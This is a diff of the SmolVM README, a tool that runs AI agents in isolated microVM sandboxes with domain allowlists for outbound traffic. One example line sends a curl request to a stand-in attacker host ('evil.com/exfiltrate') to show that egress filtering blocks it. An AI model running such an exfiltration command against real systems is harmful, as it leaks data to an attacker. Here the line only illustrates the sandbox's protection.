@@ -2,24 +2,33 @@
 
 # SmolVM
 
-**Disposable sandboxes for AI agents**
+#### Secure, isolated computers that AI agents can use to browse, run code, and get real work done. 
 
 
 <img src="https://ik.imagekit.io/gradsflow/celestoai/logo/celesto%20cover%20low_vFigbRaJI.png">
-
 
 [![CodeQL](https://github.com/CelestoAI/SmolVM/actions/workflows/github-code-scanning/codeql/badge.svg)](https://github.com/CelestoAI/SmolVM/actions/workflows/github-code-scanning/codeql)
 [![Run Tests](https://github.com/CelestoAI/SmolVM/actions/workflows/pytest.yml/badge.svg)](https://github.com/CelestoAI/SmolVM/actions/workflows/pytest.yml)
 [![License](https://img.shields.io/badge/License-Apache_2.0-orange.svg)](https://opensource.org/licenses/Apache-2.0)
 [![Python 3.10+](https://img.shields.io/badge/python-3.10+-orange.svg)](https://www.python.org/downloads/)
 
-[Docs](https://docs.celesto.ai) • [Examples](examples/) • [Slack](https://join.slack.com/t/celestoai/shared_invite/zt-3qc7h8gno-Nb5_PElEWHDNnGqdVzC~4Q)
+[Quick start](#quickstart) • [Examples](#examples) • [Features](#features) • [Performance](#performance) • [Docs](https://docs.celesto.ai) • [Community Slack](https://join.slack.com/t/celestoai/shared_invite/zt-3qc7h8gno-Nb5_PElEWHDNnGqdVzC~4Q) 
 
 </div>
 
 ---
 
 SmolVM gives AI agents their own disposable computer. Each sandbox is a lightweight virtual machine that boots in seconds, runs any code or command you throw at it, and disappears when you're done — nothing touches your host.
+
+
+## Features
+
+- **Sub-second boot** — VMs ready in ~500 ms.
+- **Hardware isolation** — Stronger security than containers.
+- **Network controls** — Domain allowlists for egress filtering.
+- **Browser sessions** — Full browser agents can see and control.
+- **Snapshots** — Save and restore VM state instantly.
+- **OpenClaw** — GUI Linux apps inside a sandbox.
 
 
 ## Use cases
@@ -123,12 +132,7 @@ vm.run("curl https://api.openai.com/v1/models")    # allowed
 vm.run("curl https://evil.com/exfiltrate")         # blocked
 ```
 
-| Setting | Default | What it does |
-| --- | --- | --- |
-| `allowed_domains` | `["*"]` (all) | List of hostnames the sandbox can reach. Accepts URLs or bare domains. |
-| `allowed_http_methods` | `["*"]` (all) | HTTP methods the sandbox can use. *Not yet enforced — reserved for a future release.* |
-
-Set `allowed_domains` to `["*"]` (or omit `internet_settings` entirely) for unrestricted access. Network controls require the Firecracker backend. See [docs/concepts/network-egress-controls.md](docs/deep-dive/network-egress-controls.md) for how it works under the hood.
+See [docs/concepts/network-egress-controls.md](docs/deep-dive/network-egress-controls.md) for how it works under the hood.
 
 
 ## Examples
